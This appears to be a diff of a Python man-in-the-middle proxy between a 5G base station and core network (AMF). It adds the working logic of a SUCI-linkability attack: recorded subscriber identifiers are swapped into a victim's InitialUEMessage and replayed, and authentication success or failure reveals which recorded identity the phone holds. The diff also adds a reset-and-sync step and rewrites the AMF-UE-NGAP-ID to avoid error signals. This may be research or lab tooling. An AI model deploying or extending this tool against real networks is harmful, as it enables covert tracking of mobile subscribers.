@@ -17,36 +17,28 @@ AMF_IP      = os.getenv("AMF_IP","127.0.0.1")
 AMF_PORT    = int(os.getenv("AMF_PORT","38412"))
 LISTEN_PORT = int(os.getenv("LISTEN_PORT","38412"))
 RECORD_MODE = os.getenv("RECORD_MODE", "false").lower() == "true"
+FAIL_BEFORE_RS = int(os.getenv("RS","2"))
 
 
 # JSON Config
 JSON_FILE = Path("collected.json")
 _json_lock = Lock()
 
-
 # NAS message types
 NAS_AUTH_RESPONSE = 0x57
 NAS_AUTH_FAILURE = 0x59
+NAS_AUTH_REQUEST = 0x56
+
+CAUSE_MAC_FAILURE  = 0x14
+CAUSE_SYNC_FAILURE = 0x15
 
 # NGAP procedure codes
 PROC_INITIAL_UE = 15
 PROC_UPLINK_NAS = 46
+PROC_DOWNLINK_NAS = 4
 
 # PPID for AMF, else failure
 NAS_PPID = 60
-
-# ATTACK SCENARIO - Default testing one
-FAKE_SUCI = {
-    "SupiFormat":         0,
-    "PLMN":                "20895",
-    "RoutingIndicator":   "0210",
-    "ProtectionSchemeId": 1,
-    "HomeNetworkPKI":     1,
-
-    "ECCEphemPK": bytes.fromhex("eef6ae97fe47bff5827ebcc9ac97f7e224e26b3867988757bebdb1c28f31aa78"),
-    "CipherText": bytes.fromhex("f153a53375"),
-    "MAC": bytes.fromhex("efe3f139dd309fd1")
-}
 
 # JSON helpers
 
@@ -115,8 +107,26 @@ def get_suci(index: int) -> dict | None:
         print(f"ERROR - get_suci failed: {e}")
         return None
 
+def get_suci_count() -> int:
+    """ Get SUCI count"""
+    try:
+        if not JSON_FILE.exists():
+            print("No collected.json file found")
+            return None
 
+        with _json_lock:
+            with open(JSON_FILE, "r") as f:
+                data = json.load(f)
 
+        if not isinstance(data, list):
+            print("Invalid JSON format (not a list)")
+            return None
+
+        return len(data)
+
+    except Exception as e:
+        print(f"ERROR - get_suci failed: {e}")
+        return None
 
 
 # NGAP helpers
@@ -155,9 +165,21 @@ def get_nas_msg_type(nas_bytes: bytes) -> int | None:
         msg, err = parse_NAS5G(nas_bytes)
         if err:
             return None
-        return msg["Type"].get_val()
+        return msg["5GMMHeader"]["Type"].get_val()
+    except Exception as e:
+        print(f"ERROR - get_nas_msg_type: {e}")
+        return None
+
+def get_nas_msg_fail_cause(nas_bytes: bytes) -> int | None:
+    try:
+        msg, err = parse_NAS5G(nas_bytes)
+        if err:
+            return None
+
+        return msg["5GMMCause"].get_val()[0]
     except Exception:
         return None
+    
 
 def get_nas_pdu(pdu) -> bytes | None:
     try:
@@ -181,24 +203,120 @@ def set_nas_pdu(pdu, new_nas: bytes) -> bytes | None:
         print(f"ERROR - NGAP rebuild failed: {e}")
         return None
 
+# PREVENT ERRORINDIATION
+def get_amf_ue_ngap_id(pdu) -> int | None:
+    try:
+        root = pdu.get_val()
+        ies = root[1]["value"][1]["protocolIEs"]
+
+        for ie in ies:
+            if ie["id"] == 10:  # id-AMF-UE-NGAP-ID
+                val = ie["value"]
+
+                if isinstance(val, tuple) and len(val) >= 2:
+                    return val[1]
+
+                if isinstance(val, int):
+                    return val
+
+                print(f"Unexpected AMF-UE-NGAP-ID value format: {val!r}")
+                return None
+
+        print("AMF-UE-NGAP-ID IE not found")
+        return None
+
+    except Exception as e:
+        print(f"ERROR - get_amf_ue_ngap_id failed: {e}")
+        return None
+    
+
+def set_amf_ue_ngap_id(pdu, new_amf_ue_id: int) -> bytes | None:
+    try:
+        root = pdu.get_val()
+        ies = root[1]["value"][1]["protocolIEs"]
+
+        for ie in ies:
+            if ie["id"] == 10:  # id-AMF-UE-NGAP-ID
+                old_val = ie["value"]
+
+                if isinstance(old_val, tuple) and len(old_val) >= 2:
+                    ie["value"] = (old_val[0], new_amf_ue_id)
+
+                elif isinstance(old_val, int):
+                    ie["value"] = new_amf_ue_id
+
+                else:
+                    print(f"ERROR - unexpected AMF-UE-NGAP-ID format: {old_val!r}")
+                    return None
+
+                pdu.set_val(root)
+                return pdu.to_aper()
+
+        print("ERROR - AMF-UE-NGAP-ID IE not found")
+        return None
+
+    except Exception as e:
+        print(f"ERROR - set_amf_ue_ngap_id failed: {e}")
+        return None
+
+
+
+
+
+
+# STATE HANDLING
+
+_attack_state:  dict[int, dict]   = {}   # ran_ue_id -> attack phase state
+_state_lock = Lock()
+
+
+def init_attack_state(ran_ue_id: int):
+    with _state_lock:
+        _attack_state[ran_ue_id] = {
+            "phase": "initial", # initial | replay | reset | success | failure
+            "suci_idx": 0,
+            "suci_count": get_suci_count(),
+            "initial_ue_message": None,
+            "amf-id": 0,
+            "fail_count": 0, # RESET & SYNC
+        }
+
+def get_state(ran_ue_id: int) -> dict | None:
+    with _state_lock:
+        return _attack_state.get(ran_ue_id)
+
+def set_phase(ran_ue_id: int, phase: str, **kwargs):
+    with _state_lock:
+        state = _attack_state.get(ran_ue_id)
+        if state:
+            state["phase"] = phase
+            state.update(kwargs)
+
+
+
+
+
+
+
+
+
 
 # ATTACK FUNCTION
-def replace_suci(nas_bytes: bytes) -> bytes | None:
+def replace_suci(nas_bytes: bytes, state: dict | None = None) -> bytes | None:
     try:
         msg, err = parse_NAS5G(nas_bytes)
         if err:
             print(f"ERROR - NAS parse error: {err}")
             return None
         
-        try:
-            # print(msg.show())
-            original = msg["5GSID"].get_val()
-            print(f"Original mobile identity: {original}")
-        except Exception:
-            pass
-        
+        if state is None:
+            idx = 0
+        else:
+            idx = state["suci_idx"]
+            state["suci_idx"] += 1
 
-        FAKE_SUCI = get_suci(0)
+        FAKE_SUCI = get_suci(idx)
+        print("Forwarding InitialUEMessage with SUCI", state["suci_idx"]-1)
 
         if FAKE_SUCI is None:
             print("ERROR - no SUCI available, forwarding original")
@@ -217,12 +335,6 @@ def replace_suci(nas_bytes: bytes) -> bytes | None:
 
         # Read scheme output
         out = suci["Output"].get_alt()
-        orig_pk  = out["ECCEphemPK"].get_val()
-        orig_ct  = out["CipherText"].get_val()
-        orig_mac = out["MAC"].get_val()
-        print(f" Original ECCEphemPK: {orig_pk.hex()}")
-        print(f"Original CipherText: {orig_ct.hex()}")
-        print(f"Original MAC: {orig_mac.hex()}")
 
         # Replace scheme output 
         out["ECCEphemPK"].from_bytes(FAKE_SUCI["ECCEphemPK"])
@@ -237,6 +349,9 @@ def replace_suci(nas_bytes: bytes) -> bytes | None:
         print(f"ERROR - replace_suci failed: {e}")
         return None
 
+
+
+# RECORD MODE
 def record_suci(nas_bytes: bytes) -> None:
     try:
         msg, err = parse_NAS5G(nas_bytes)
@@ -297,11 +412,20 @@ def uplink(gnb_sock, amf_sock):
             # Decode PDU and retrieve 
             pdu  = decode_ngap(data)
             proc = get_procedure_code(pdu) if pdu else None
+            ran_ue_id = get_ran_ue_id(pdu)
+
+            if get_state(ran_ue_id) is None:
+                init_attack_state(ran_ue_id)
+
+            state = get_state(ran_ue_id)
+            
+                
 
 
             # Initial UE message
             if pdu and proc == PROC_INITIAL_UE:
-                ran_ue_id = get_ran_ue_id(pdu)
+                
+               
                 print(f"InitialUEMessage — RAN-UE-NGAP-ID: {ran_ue_id}")
 
                 # Retreive NAS and replace it before forwarding
@@ -313,12 +437,18 @@ def uplink(gnb_sock, amf_sock):
                         record_suci(nas)
                         amf_sock.sctp_send(data, ppid=NAS_PPID)
                         continue
+                    
 
-                    patched_nas = replace_suci(nas)
+                    patched_nas = replace_suci(nas,state)
                     if patched_nas:
                         rebuilt = set_nas_pdu(pdu, patched_nas)
                         if rebuilt:
                             print("Forwarding patched InitialUEMessage")
+
+                            if state["phase"] == "initial":
+                                print("Recording InitialUEMessage for later tampering")
+                                state["initial_ue_message"] = data
+
                             amf_sock.sctp_send(rebuilt, ppid=NAS_PPID)
                             continue
                         else:
@@ -329,19 +459,61 @@ def uplink(gnb_sock, amf_sock):
                     print("No NAS-PDU — forwarding original")
             
             # Auth response
-            elif pdu and proc == PROC_UPLINK_NAS:
-                ran_ue_id = get_ran_ue_id(pdu)
+            elif pdu and proc == PROC_UPLINK_NAS and not RECORD_MODE:
+                
                 print(f"Authentication Response/Failure — RAN-UE-NGAP-ID: {ran_ue_id}")
                 nas = get_nas_pdu(pdu)
                 if nas:
                     msg_type = get_nas_msg_type(nas)
 
+
                     if msg_type == NAS_AUTH_RESPONSE:
-                        print(f"Authentication Response — RAN-UE-NGAP-ID: {ran_ue_id} - SUCI TO UE FOUND!!!")
+                        print(f"Authentication Response — RAN-UE-NGAP-ID: {ran_ue_id}")
+                        
+                        if state["phase"] == "reset":
+                            # AFTER RESET & SYNC
+                            state["phase"] = "replay"
+                            replay_pdu = decode_ngap(state["initial_ue_message"])
+                            replay_nas = get_nas_pdu(replay_pdu)
+
+                            if replay_nas:
+                                patched_nas = replace_suci(replay_nas,state)
+                                if patched_nas:
+                                    rebuilt = set_nas_pdu(replay_pdu, patched_nas)
+                                    amf_sock.sctp_send(rebuilt, ppid=NAS_PPID)
+                                    continue
+
+                        elif state["phase"] != "failure":
+                            print("UE successfully found", state["suci_idx"]-1)
+                            set_phase(ran_ue_id, "success")
 
 
                     elif msg_type == NAS_AUTH_FAILURE:
                         print(f"Authentication Failure — RAN-UE-NGAP-ID: {ran_ue_id}")
+                        state["fail_count"] += 1
+                        
+                        if state["suci_idx"] >= state["suci_count"]:
+                            print("No SUCI matched, UE not in list")
+                            set_phase(ran_ue_id, "failure")
+                            amf_sock.sctp_send(state["initial_ue_message"], ppid=NAS_PPID)
+                            continue
+                        
+                        elif state["fail_count"] >= FAIL_BEFORE_RS:
+                            print("Reset & Sync")
+                            set_phase(ran_ue_id, "reset")
+                            state["fail_count"] = 0
+                            amf_sock.sctp_send(state["initial_ue_message"], ppid=NAS_PPID)
+                            continue
+
+                        replay_pdu = decode_ngap(state["initial_ue_message"])
+                        replay_nas = get_nas_pdu(replay_pdu)
+
+                        if replay_nas:
+                            patched_nas = replace_suci(replay_nas,state)
+                            if patched_nas:
+                                rebuilt = set_nas_pdu(replay_pdu, patched_nas)
+                                amf_sock.sctp_send(rebuilt, ppid=NAS_PPID)
+                                continue
 
             amf_sock.sctp_send(data, ppid=NAS_PPID)
 
@@ -359,12 +531,47 @@ def downlink(gnb_sock, amf_sock):
             if not data:
                 print("Downlink: connection closed")
                 break
+            
+            
 
+            pdu  = decode_ngap(data)
+            proc = get_procedure_code(pdu) if pdu else None
+
+            if pdu and proc == PROC_DOWNLINK_NAS:
+                ran_ue_id = get_ran_ue_id(pdu)
+                nas       = get_nas_pdu(pdu)
+                state = get_state(ran_ue_id)
+                
+                if state and (state["phase"] == "failure" or state["phase"] == "success"):
+                    gnb_sock.sctp_send(data, ppid=NAS_PPID)
+                    continue
+
+                if nas:
+                    msg_type = get_nas_msg_type(nas)
+
+                    if msg_type == NAS_AUTH_REQUEST:
+                        if state is None:
+                            init_attack_state(ran_ue_id)
+                            state = get_state(ran_ue_id)
+
+                    if state["phase"] == "initial":
+                        amf_id = get_amf_ue_ngap_id(pdu)
+                        print("Original InitialUEMessage received. Saving AMF-UE-NGAP-ID", amf_id)
+                        state["amf-id"] = amf_id
+                        set_phase(ran_ue_id, "replay")
+                    
+                    else:
+                        pdu = set_amf_ue_ngap_id(pdu, state["amf-id"])
+                        gnb_sock.sctp_send(pdu, ppid=NAS_PPID) # FIX THE AMF-ID to match the initial one, else Error Indication
+                        continue
+
+            
             gnb_sock.sctp_send(data, ppid=NAS_PPID)
 
         except Exception as e:
             print(f"ERROR - downlink error {type(e).__name__}: {e}")
             break
+
 
 # Connection handler
 def handle(gnb_sctp):
